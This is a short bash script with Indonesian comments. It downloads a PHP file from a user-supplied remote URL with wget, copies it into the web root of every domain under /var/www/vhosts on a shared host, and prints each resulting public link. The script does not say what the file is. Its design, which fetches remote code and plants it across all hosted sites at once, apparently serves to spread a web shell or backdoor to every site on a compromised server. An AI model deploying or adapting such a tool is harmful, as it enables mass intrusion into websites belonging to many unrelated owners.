#!/bin/bash

# Meminta nama file yang akan disalin ke semua domain
read -p "Masukkan nama file PHP (misalnya: bps.php): " file_to_upload

# Meminta URL sumber file (RAW link)
read -p "Masukkan URL file PHP (RAW_URL): " REMOTE_URL

# Unduh file ke lokal
if wget -q "$REMOTE_URL" -O "$file_to_upload"; then
    echo "File berhasil diunduh: $file_to_upload"
else
    echo "Gagal mengunduh file dari $REMOTE_URL"
    exit 1
fi

# Loop melalui semua direktori domain di /var/www/vhosts
for domain_dir in /var/www/vhosts/*; do
    [ -d "$domain_dir" ] || continue
    domain=$(basename "$domain_dir")

    # Cek lokasi-lokasi target yang mungkin ada
    for target in "$domain_dir/httpdocs" "$domain_dir/public_html" "$domain_dir" ; do
        if [ -d "$target" ]; then
            # Salin file ke folder utama
            cp -f "$file_to_upload" "$target/" && \
            echo "https://$domain/$(basename "$file_to_upload") (ke $target)"
            
            # Jika di dalamnya ada folder 'public', salin juga ke sana
            if [ -d "$target/public" ]; then
                cp -f "$file_to_upload" "$target/public/" && \
                echo "↳ Juga disalin ke $target/public/"
            fi
        fi
    done
done

echo "Selesai menyalin file ke semua domain yang ditemukan."
